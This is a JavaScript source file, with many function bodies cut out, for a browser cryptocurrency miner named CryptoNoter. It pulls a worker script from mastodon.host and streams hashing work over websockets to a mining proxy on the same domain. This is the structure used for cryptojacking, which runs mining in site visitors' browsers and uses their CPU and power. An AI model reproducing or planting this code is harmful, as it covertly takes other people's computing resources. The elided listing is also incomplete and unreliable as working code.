(function (window) {
    "use strict";
    var Mining = function (siteKey, params) {
        params = params || {};
    ...
    Mining.prototype.start = function (mode) {
        ...
        if (this._useWASM || this._asmjsStatus === "loaded") {
            ...
            xhr.open("get", "https://mastodon.host/worker.js", true);
            xhr.send()
    ...
    Mining.prototype.stop = function (mode) {
    ...
    Mining.prototype.getHashesPerSecond = function () {
    ...
    Mining.prototype.getTotalHashes = function (estimate) {
        var now = Date.now();
    ...
    Mining.prototype.getAcceptedHashes = function () {
        return this._hashes
    };
    Mining.prototype.getToken = function () {
        return this._tokenFromServer
    };
    Mining.prototype.on = function (type, callback) {
        if (this._eventListeners[type]) {
            this._eventListeners[type].push(callback)
        }
    };
    Mining.prototype.getAutoThreadsEnabled = function (enabled) {
        return this._autoThreads.enabled
    };
    Mining.prototype.setAutoThreadsEnabled = function (enabled) {
    ...
    Mining.prototype.getThrottle = function () {
        return this._throttle
    };
    Mining.prototype.setThrottle = function (throttle) {
        this._throttle = Math.max(0, Math.min(.99, throttle));
        if (this._currentJob) {
            this._setJob(this._currentJob)
        }
    };
    Mining.prototype.getNumThreads = function () {
        return this._targetNumThreads
    };
    Mining.prototype.setNumThreads = function (num) {
    ...
    Mining.prototype.hasWASMSupport = function () {
        return window.WebAssembly !== undefined
    };
    Mining.prototype.isRunning = function () {
        return this._threads.length > 0
    };
    Mining.prototype._startNow = function () {
    ...
    Mining.prototype._otherTabRunning = function () {
    ...
    Mining.prototype._updateTabs = function () {
    ...
    Mining.prototype._adjustThreads = function () {
    ...
    Mining.prototype._emit = function (type, params) {
    ...
    Mining.prototype._hashString = function (s) {
        var hash = 5381,
            i = s.length;
        while (i) {
    ...
    Mining.prototype._connect = function () {
        if (this._socket) {
            return
        }
    ...
    Mining.prototype._onOpen = function (ev) {
        this._emit("open");
        var params = {
    ...
    Mining.prototype._onError = function (ev) {
        this._emit("error", {
            error: "connection_error"
        });
        this._onClose(ev)
    };
    Mining.prototype._onClose = function (ev) {
    ...
    Mining.prototype._onMessage = function (ev) {
    ...
    Mining.prototype._setJob = function (job) {
    ...
    Mining.prototype._onTargetMet = function (result) {
    ...
    Mining.prototype._onVerified = function (verifyResult) {
        this._send("verified", verifyResult)
    };
    Mining.prototype._send = function (type, params) {
        if (!this._socket) {
            return
        }
        var msg = {
    ...
    window.CryptoNoter.Token = function (siteKey, goal, params) {
        var miner = new Mining(siteKey, params);
        miner._goal = goal || 0;
        return miner
    };
...
self.CryptoNoter.CONFIG = {
    LIB_URL: "https://mastodon.host/mlib/",
    WEBSOCKET_SHARDS: [["wss://mastodon.host/mproxy"]]
};
